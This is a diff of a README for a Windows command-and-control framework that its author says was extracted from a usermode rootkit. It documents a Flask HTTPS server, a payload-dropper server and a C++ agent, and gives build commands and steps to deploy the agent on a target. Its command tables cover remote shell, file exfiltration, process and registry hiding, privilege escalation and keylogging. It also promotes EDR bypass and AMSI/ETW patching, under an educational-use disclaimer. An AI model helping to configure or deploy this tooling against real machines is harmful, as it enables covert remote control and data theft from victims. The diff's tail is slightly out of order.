@@ -1,105 +1,133 @@
-# XvX C2 Infrastructure
+# PULSE C2 Framework
 
-![C2 Project](https://img.shields.io/badge/Project-C2%20Framework-red)
+![C2 Project](https://img.shields.io/badge/Project-PULSE%20C2-red)
 ![Language](https://img.shields.io/badge/Python-3.9+-blue)
 ![Language](https://img.shields.io/badge/C++-17-blue)
 ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
+![License](https://img.shields.io/badge/License-Educational-yellow)
 
-Command & Control infrastructure extracted from XvX Usermode Rootkit project.
+**HTTPS Command & Control infrastructure with web dashboard for remote agent management.**
 
-> **Educational Use Only**  
-> This C2 framework is for **research and defensive learning purposes only**.
-> Unauthorized use on systems you don't own is **illegal**.
+Extracted from the [XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit) project - a full-featured Windows rootkit with inline hooking, privilege escalation, and EDR evasion capabilities.
+
+> **⚠️ Educational Use Only**  
+> This C2 framework is for **security research and defensive learning purposes only**.  
+> Unauthorized use on systems you don't own is **illegal and unethical**.
 
 ---
+
+## ✨ Features
+
+- **HTTPS C2 Server** - Flask-based with TLS encryption
+- **Web Dashboard** - Real-time agent monitoring and control
+- **XOR Encryption** - Custom protocol with Base64 encoding
+- **SQLite Database** - Persistent agent/task/result storage
+- **Command Execution** - Remote shell, file exfiltration, sleep control
+- **Auto-Registration** - Agent fingerprinting with unique IDs
+- **Cross-Platform Server** - Python runs on Windows/Linux/macOS
+- **Production-Ready** - Silent agent with no debug output
 
 ## 📁 Project Structure
 
 ```
 C2/
-├── server/                 # Python Flask HTTPS C2 Server
-│   ├── c2_server.py       # Main C2 server (3318 lines)
-│   ├── http_server.py     # HTTP dropper server (147 lines)
-│   ├── cert.pem           # SSL certificate
-│   ├── key.pem            # SSL private key
-│   └── c2.db              # SQLite database (auto-generated)
+├── server/
+│   ├── c2_server.py       # Flask HTTPS C2 server (140 KB)
+│   ├── http_server.py     # HTTP payload delivery server
+│   ├── cert.pem           # SSL certificate (auto-generated)
+│   └── key.pem            # SSL private key
 │
-├── client/                 # C++ Windows Agent
-│   └── c2_client_example.cpp  # Example beacon implementation
+├── client/
+│   └── c2_client.cpp      # Windows agent (production build)
 │
-├── include/                # Headers
-│   └── C2Client.h         # C++ client class (598 lines)
+├── include/
+│   └── C2Client.h         # C++ client class
 │
-└── docs/                   # Documentation
-    └── README.md           # This file
+├── build.bat              # Windows compilation script
+├── start_server.bat       # Server startup script
+└── README.md              # This file
 ```
 
 ---
 
 ## 🚀 Quick Start
 
-### **1. Server Setup**
+### **Server Setup**
 
+**Windows:**
+```cmd
+start_server.bat
+```
+
+**Manual:**
 ```bash
 cd server
-
-# Install dependencies
 pip install flask
-
-# Generate SSL certificates (if not present)
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
-
-# Start C2 server
 python c2_server.py
 ```
 
-**Server will start on:**
-- Dashboard: `https://localhost:8443`
-- API Endpoints: `https://localhost:8443/api/*`
-- Reverse Shell Listener: `tcp://0.0.0.0:4444`
+**Access dashboard:** `https://localhost:8443`
 
-### **2. HTTP Dropper Server (Optional)**
+---
 
-```bash
-cd server
-python http_server.py 8000
+### **Client Compilation**
+
+**Windows (MinGW):**
+```cmd
+build.bat
 ```
 
-Serves payloads on `http://localhost:8000/`
-
-### **3. Client Compilation**
-
+**Manual:**
 ```bash
-# MinGW-w64 (Windows)
-g++ -o agent.exe client/c2_client_example.cpp -lwinhttp -lws2_32 -std=c++17 -O2 -s
-
-# MSVC (Visual Studio)
-cl.exe /EHsc /O2 client/c2_client_example.cpp /Fe:agent.exe winhttp.lib
+g++ -o agent.exe client/c2_client.cpp -I./include -lwinhttp -lws2_32 -std=c++17 -O2 -s -static-libgcc -static-libstdc++
 ```
 
-**Before compiling**, edit `c2_client_example.cpp`:
+**Configure C2 IP** - Edit [client/c2_client.cpp](client/c2_client.cpp) line 162:
 ```cpp
 wstring c2ServerUrl = L"https://YOUR_SERVER_IP:8443";
 ```
 
 ---
 
-## 📡 C2 Protocol
+### **Deployment**
 
-### **Communication Flow**
+1. Start C2 server
+2. Compile agent with your server IP
+3. Deploy `agent.exe` on target
+4. Monitor dashboard for agent check-in
 
+---
+
+## 📡 C2 Commands
+
+| Command | Syntax | Description |
+|---------|--------|-------------|
+| `shell` | `shell <cmd>` | Execute shell command via cmd.exe |
+| `exfil` | `exfil <path>` | Exfiltrate file content (Base64) |
+| `sleep` | `sleep <seconds>` | Change beacon interval |
+| `ping` | `ping` | Test connectivity (returns PONG) |
+| `die` | `die` | Terminate agent |
+
+**Example (from dashboard):**
 ```
-Agent                           C2 Server
-  |                                 |
-  |-- HTTPS POST /api/checkin ----->|  (Beacon + System Info)
-  |                                 |
-  |<---- XOR+Base64 Commands -------|  (Queued tasks)
-  |                                 |
-  |-- HTTPS POST /api/result ------>|  (Execution results)
-  |                                 |
+Command: shell
+Argument: whoami
+→ Execute
 ```
 
-### **Encryption**
+---
+
+## 🔒 C2 Protocol
+
+### **Encryption Scheme**
+
+**XOR Key Generation:**
+```
+XOR_KEY = ComputerName + Username + "SecretKey2025"
+Example: "DESKTOP-ABC123john.doeSecretKey2025"
+```
+
+**Encoding Stack:**
 
 **Key Generation:**
 ```
@@ -119,107 +147,139 @@ XOR_KEY = ComputerName + Username + "SecretKey2025"
 agent_id|hostname|username|os_version
 ```
 
-**Response (Server → Agent):**
 ```
-command1|arg1|arg2
-command2|arg1
-...
+Plaintext → UTF-8 → XOR → Base64 → HTTPS
+```
+
+**Communication Flow:**
+```
+Agent                    C2 Server
+  |                          |
+  |--POST /api/checkin------>| (Beacon)
+  |<--XOR+Base64 commands----| (Tasks)
+  |                          |
+  |--POST /api/result------->| (Results)
+  |<--200 OK-----------------| (ACK)
 ```
 
 ---
 
-## 🎯 Supported Commands
+## 🌐 Web Dashboard
 
-### **Basic Commands**
+**Access:** `https://localhost:8443`
 
-| Command | Syntax | Description |
-|---------|--------|-------------|
-| `shell` | `shell <cmd>` | Execute shell command via cmd.exe |
-| `exfil` | `exfil <path>` | Exfiltrate file content (Base64) |
-| `sleep` | `sleep <seconds>` | Change beacon interval |
-| `ping` | `ping` | Test connectivity (returns PONG) |
-| `die` | `die` | Terminate agent |
+**Features:**
+- Real-time agent monitoring (online/offline status)
+- Interactive command execution
+- Command history with results
+- Statistics dashboard
+- Auto-refresh (5s interval)
 
-### **Advanced Commands (Full Rootkit Only)**
-
-| Command | Syntax | Description |
-|---------|--------|-------------|
-| `hide_process` | `hide_process <name>` | Hide process from Task Manager |
-| `hide_file` | `hide_file <path>` | Hide file/folder from Explorer |
-| `hide_registry` | `hide_registry <key>` | Hide registry key from Regedit |
-| `unhide_process` | `unhide_process <name>` | Restore process visibility |
-| `unhide_file` | `unhide_file <path>` | Restore file visibility |
-| `unhide_registry` | `unhide_registry <key>` | Restore registry key |
-| `unhide_all` | `unhide_all` | Unhide all hidden items |
-| `privesc` | `privesc` | Escalate to SYSTEM (Named Pipe/Token) |
-| `revshell_start` | `revshell_start` | Start interactive cmd.exe session |
-| `revshell_input` | `revshell_input <cmd>` | Execute in interactive session |
-| `revshell_output` | `revshell_output` | Read session output buffer |
-| `revshell_stop` | `revshell_stop` | Terminate interactive session |
+**Sections:**
+- **Agents** - List of registered agents with details
+- **Commands** - Dropdown menu with argument input
+- **Results** - Execution output with timestamps
+- **Stats** - Active sessions, success rates
 
 ---
 
-## 🖥️ Web Dashboard
+## 🗄️ Database
 
-### **Features**
+**SQLite Schema (c2.db):**
 
-- **Agents Management**: Real-time agent status (online/offline)
-- **Command Execution**: Interactive command interface
-- **Results Viewer**: Full command output with timestamps
-- **Keylogger**: Real-time keystroke exfiltration display
-- **Statistics**: Total agents, success/failure rates
-- **Auto-refresh**: 5-second polling interval
-
-### **Dashboard Sections**
-
-1. **Agents Table**: AgentID, Hostname, User, OS, IP, Status
-2. **Command Panel**: Dropdown commands + argument input
-3. **Results**: Command history with color-coded status
-4. **Keylogs**: Captured keystrokes with window titles
-5. **Statistics**: Real-time counters (online/offline/total)
+| Table | Purpose |
+|-------|---------|
+| `agents` | Registered agents (ID, hostname, IP, timestamps) |
+| `tasks` | Command queue (pending/sent) |
+| `results` | Execution results (command, status, output) |
+| `keylogs` | Keystroke captures (requires full rootkit) |
 
 ---
 
-## 🗄️ Database Schema
+## 🔗 Related Project
 
-### **SQLite Tables**
+**Full Rootkit Features:**
 
-**agents:**
-```sql
-agent_id TEXT PRIMARY KEY
-hostname TEXT
-username TEXT
-os_version TEXT
-ip_address TEXT
-first_seen TEXT (ISO 8601)
-last_seen TEXT (ISO 8601)
-```
+For advanced capabilities (process/file/registry hiding, privilege escalation, keylogger, EDR evasion), check out the complete **[XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit)** project.
 
-**tasks:**
-```sql
-id INTEGER PRIMARY KEY
-agent_id TEXT
-command TEXT
-status TEXT ('pending'|'sent')
-created_at TEXT
-```
+**Additional features in full rootkit:**
+- Inline hooking (x64 trampolines)
+- DLL injection (CreateRemoteThread)
+- Token stealing (SYSTEM escalation)
+- NTDLL unhooking (EDR bypass)
+- ETW/AMSI patching
+- VM/Debugger detection
+- Indirect syscalls
+- Persistence mechanisms
 
-**results:**
-```sql
-id INTEGER PRIMARY KEY
-agent_id TEXT
-command TEXT
-status TEXT ('success'|'error')
-output TEXT
-received_at TEXT
-```
+---
 
-**keylogs:**
-```sql
-id INTEGER PRIMARY KEY
-agent_id TEXT
-window_title TEXT
-keystrokes TEXT (raw)
+## 📋 Requirements
+
+**Server:**
+- Python 3.9+
+- Flask (`pip install flask`)
+- OpenSSL (for SSL certificates)
+
+**Client:**
+- MinGW-w64 GCC 15.2+ or MSVC 2019+
+- Windows SDK (WinHTTP.h)
+- C++17 compiler
+
+---
+
+## 🛠️ Troubleshooting
+
+**Agent not appearing in dashboard:**
+- Verify server is running (`netstat -an | findstr 8443`)
+- Check firewall rules (allow port 8443)
+- Confirm agent IP matches server URL
+- Review server logs for decryption errors
+
+**Compilation errors:**
+- Install MinGW-w64: https://www.mingw-w64.org/
+- Add to PATH: `C:\mingw64\bin`
+- Ensure WinHTTP linked: `-lwinhttp -lws2_32`
+
+---
+
+## ⚠️ Legal Disclaimer
+
+**This project is for EDUCATIONAL and RESEARCH purposes only.**
+
+By using this software, you agree to:
+- Only test on systems you own or have explicit written authorization
+- Comply with all applicable laws and regulations
+- Accept full responsibility for your actions
+
+**The author is NOT responsible for:**
+- Misuse of this software
+- Damage caused by unauthorized use
+- Legal consequences of illegal activities
+
+**Use responsibly and ethically.**
+
+---
+
+## 📧 Contact
+
+**Author:** 28zaakypro@proton.me  
+**Project:** PULSE C2 Framework  
+**Rootkit:** [XvX Usermode Rootkit](https://github.com/28Zaaky/Usermode-Rootkit)
+
+---
+
+## 📄 License
+
+**Educational Use Only**
+
+Copyright (c) 2026
+
+This software is provided for security research and educational purposes.
+
+---
+
+**For defensive cybersecurity training only.**
 cleaned_text TEXT (interpreted)
 timestamp TEXT
 ```
